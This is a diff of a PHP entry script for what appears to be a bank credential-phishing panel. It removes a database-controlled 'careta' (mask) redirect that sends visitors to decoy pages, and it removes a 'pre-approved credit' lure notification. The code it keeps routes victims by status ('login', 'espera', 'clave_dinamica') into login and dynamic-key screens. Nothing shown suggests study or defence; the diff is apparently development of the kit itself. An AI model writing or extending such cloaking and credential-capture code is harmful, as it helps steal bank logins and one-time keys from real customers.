@@ -16,41 +16,6 @@ if (isset($_GET['install'])) {
     exit();
 }
 
-// Careta Mode Check — leer modo desde DB ('seguro', 'portnew', 'off')
-$caretaMode = 'seguro'; // default
-try {
-    $dbConn = (isset($conn) && $conn instanceof PDO) ? $conn : require __DIR__ . '/config/db.php';
-    $stmt = $dbConn->prepare("SELECT value FROM settings WHERE key = 'careta_mode'");
-    $stmt->execute();
-    $row = $stmt->fetch(PDO::FETCH_ASSOC);
-    if ($row !== false && in_array($row['value'], ['seguro', 'portnew', 'off'])) {
-        $caretaMode = $row['value'];
-    } else {
-        // Fallback de compatibilidad con redirect_enabled
-        $stmt2 = $dbConn->prepare("SELECT value FROM settings WHERE key = 'redirect_enabled'");
-        $stmt2->execute();
-        $row2 = $stmt2->fetch(PDO::FETCH_ASSOC);
-        if ($row2 !== false && $row2['value'] === '0') {
-            $caretaMode = 'off';
-        }
-    }
-}
-catch (Exception $e) {
-    $caretaMode = 'seguro';
-}
-
-// Redirección según la careta seleccionada (si no hay id o cupo activo en la URL)
-if (!isset($_GET['id']) && !isset($_GET['cupo'])) {
-    if ($caretaMode === 'seguro') {
-        header("Location: seguro/tunicio.php");
-        exit();
-    } elseif ($caretaMode === 'portnew') {
-        header("Location: seguro.php");
-        exit();
-    }
-    // Si $caretaMode === 'off', no redirige y va directo al login
-}
-
 // Mobile check removed to allow PC access
 if (session_status() === PHP_SESSION_NONE) {
     session_start();
@@ -112,11 +77,6 @@ elseif ($status === 'clave_dinamica' || $status === 'clave_dinamica_error') { //
 if ($status === 'login' || $status === 'espera' || $status === 'erroruser') {
     include 'partials/notification_banner.php';
     include 'partials/login.php';
-}
-
-// Toast de cupo pre-aprobado (llega desde seguro.php con ?cupo=preaprobado)
-if (($status === 'login' || $status === 'espera') && isset($_GET['cupo']) && $_GET['cupo'] === 'preaprobado') {
-    include 'partials/cupo_preaprobado_notification.php';
 }
 
 // 2. Basado en el 'status', decidimos qué vista/overlay mostrar encima.
